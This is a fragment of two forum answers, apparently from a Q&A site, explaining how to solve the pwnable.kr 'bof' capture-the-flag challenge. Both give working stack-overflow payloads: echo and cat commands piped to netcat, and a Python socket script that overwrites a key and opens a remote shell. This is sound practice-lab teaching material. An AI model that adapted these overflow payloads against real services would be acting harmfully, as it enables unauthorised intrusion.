However, I wanted to give an alternative answer without Python, but from the terminal. IMO Python is always preferred for better automation, but sometimes you just wanna have a quick exploit done without extra tools.</p>\n<p>With that in mind, one's natural attempt would be something like below:</p>\n<pre><code>echo -e \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xbe\\xba\\xfe\\xca\\x0a\" | nc pwnable.kr 9000\n</code></pre>\n<p>After all, this is an exact replica of the code above in Python, right? Except, the server begs to differ:</p>\n<blockquote>\n<p>*** stack smashing detected ***: /home/bof/bof terminated overflow me :</p>\n</blockquote>\n<p>So, what is the problem, then?</p>\n<p>Think about the command above, for a moment. It sends a bunch of characters to the stdin of the remote process, in the hopes of running /bin/sh. However, we still get greeted by the error. The reason for this, is that we are sending the correct payload, but then we are <em>stopping</em>. EOF. /bin/sh has no input, so execution continues to the next line, until the stack protector kicks in.</p>\n<p>The reason why Python works and the <code>echo</code> command doesn't, is continuity. Python doesn't close the stream, while the terminal version does.</p>\n<p>To prove it, here's a slightly longer version of the terminal exploit, which actually works:</p>\n<pre><code>echo -e \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xbe\\xba\\xfe\\xca\\x0a\" &gt; payload.bin\n</code></pre>\n<p>First, we save the exact payload as before, to a file named payload.bin in this case. Next, we run the following command:</p>\n<pre><code>cat payload.bin - | nc pwnable.kr 9000\n</code></pre>\n<p>(Note the - after payload.bin, after cat is done outputting contents of payload.bin, it will start outputting whatever comes in via stdin)</p>\n<p>And voila! Now you are actually in. You can try typing shell commands, such as <code>cat flag</code>, or <code>touch /tmp/pwned</code> or whatever you like.</p>\n<p>Whew! That was long. Hope this info will help other confused souls as it did help me a while ago.</p>\n</div>",

If you overwrite <code>key</code> correctly, you get an interactive shell before the stack check is performed at the end of <code>func()</code>. Here's the proof in the form of a Python script:</p>\n<pre><code>import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"pwnable.kr\", 9000))\ns.send(\"A\"*52 + \"\\xBE\\xBA\\xFE\\xCA\" + \"\\x0A\")\nprint \"You now have an interactive shell :)\"\nwhile True:\n    s.send(raw_input() + \"\\x0A\")\n    print s.recv(1024)\n</code></pre>\n</div>",
